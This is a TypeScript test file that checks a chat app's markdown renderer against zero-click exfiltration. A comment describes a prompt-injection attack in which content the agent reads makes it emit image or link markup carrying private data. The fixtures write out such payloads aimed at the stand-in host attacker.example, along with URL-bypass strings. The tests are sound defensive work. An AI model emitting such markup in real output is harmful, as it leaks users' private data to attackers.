import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { Markdown } from "@/components/ai-elements/markdown";
import { MarkdownContent } from "@/components/workspace/messages/markdown-content";
import {
  defangHost,
  defangUrl,
  isAppUrl,
  isLocalImageUrl,
} from "@/core/display/defang";
import { reasoningPlugins, streamdownPlugins } from "@/core/streamdown";

/**
 * Review 4 (zero-click exfiltration): an email or page the agent read makes it
 * write a markdown image or autolink carrying private data. The browser
 * fetched the image on render. Adapted from the reviewer's attack
 * (review4-attacks-53.test.ts) to main: no outside <img src>, no preload, no
 * live href to the outside host; the app's own images still render.
 */
const SECRET = "T-3%20acquire%20Acme%20for%20%2440M";
const AGENT_TEXT = [
  "Here is your summary.",
  "",
  `![status](https://attacker.example/pixel.png?d=${SECRET})`,
  "",
  `Details: <https://attacker.example/c?d=${SECRET}>`,
  "",
  `And [the summary](https://attacker.example/s?d=${SECRET}).`,
].join("\n");

const RAW_HTML = [
  `<img src="https://attacker.example/raw.png?d=${SECRET}">`,
  `<img srcset="https://attacker.example/s.png?d=${SECRET} 2x">`,
  `<video poster="https://attacker.example/p.png?d=${SECRET}"></video>`,
  `<link rel="preload" as="image" href="https://attacker.example/l.png?d=${SECRET}">`,
  `<div style="background:url(https://attacker.example/bg.png?d=${SECRET})">x</div>`,
  `<iframe src="https://attacker.example/f?d=${SECRET}"></iframe>`,
  `<svg><image href="https://attacker.example/svg.png?d=${SECRET}"></image></svg>`,
].join("\n\n");

const OUTSIDE =
  /(src|srcset|href|poster)="(https?:)?\/\/attacker\.example|url\(https:\/\/attacker/i;

function render(
  content: string,
  rehypePlugins = streamdownPlugins.rehypePlugins,
) {
  return renderToStaticMarkup(
    createElement(MarkdownContent, {
      content,
      isLoading: false,
      rehypePlugins,
    }),
  );
}

describe("chat markdown: injected image / autolink / link (zero-click)", () => {
  it("renders no fetching <img>, no preload, and no live link to an outside host", () => {
    const html = render(AGENT_TEXT);
    expect(html).not.toMatch(/<img[^>]+src="https:\/\/attacker\.example/);
    expect(html).not.toMatch(/href="https:\/\/attacker\.example/);
    expect(html).not.toMatch(/rel="preload"/);
    expect(html).not.toMatch(OUTSIDE);
    // Said, not silently dropped.
    expect(html).toContain("Image from attacker[.]example not loaded");
    // The autolink shows its URL, defanged; the labelled link is a button.
    expect(html).toContain("hxxps://attacker[.]example/c?d=");
    expect(html).toContain("data-external-link");
  });

  it("raw HTML in agent text loads nothing from outside either", () => {
    const html = render(RAW_HTML);
    expect(html).not.toMatch(OUTSIDE);
    expect(html).not.toMatch(/<(iframe|link)\b/);
  });

  it("holds for every renderer through the shared Markdown (reasoning, default plugins)", () => {
    for (const rehypePlugins of [reasoningPlugins.rehypePlugins, undefined]) {
      const html = renderToStaticMarkup(
        createElement(Markdown, { rehypePlugins }, AGENT_TEXT),
      );
      expect(html).not.toMatch(OUTSIDE);
    }
  });

  it("the app's own images and links still render live", () => {
    const html = render(
      "![chart](/api/threads/t1/artifacts/mnt/user-data/outputs/chart.png)\n\n[open](/workspace/chats/t1)",
    );
    expect(html).toMatch(
      /<img[^>]+src="\/api\/threads\/t1\/artifacts\/mnt\/user-data\/outputs\/chart\.png"/,
    );
    expect(html).toMatch(/href="\/workspace\/chats\/t1"/);
  });
});

describe("defang helper", () => {
  it("tells the app's own URLs from everything else, as the browser parses them", () => {
    expect(isAppUrl("/api/threads/x")).toBe(true);
    expect(isAppUrl("chart.png")).toBe(true);
    expect(isAppUrl("/mnt/user-data/outputs/a.png")).toBe(true);
    for (const bad of [
      "https://attacker.example/x",
      "//attacker.example/x",
      "/\\attacker.example/x",
      "ht\ntps://attacker.example/x",
      "javascript:alert(1)",
    ]) {
      expect(isAppUrl(bad), bad).toBe(false);
    }
    expect(isLocalImageUrl("data:image/png;base64,AAAA")).toBe(true);
    expect(isLocalImageUrl("data:text/html,x")).toBe(false);
  });

  it("defangs host and URL", () => {
    expect(defangHost("https://attacker.example/x")).toBe("attacker[.]example");
    expect(defangUrl(`https://attacker.example/c?d=${SECRET}`)).toBe(
      `hxxps://attacker[.]example/c?d=${SECRET}`,
    );
    expect(defangUrl("http://a.b")).toBe("hxxp://a[.]b");
  });
});
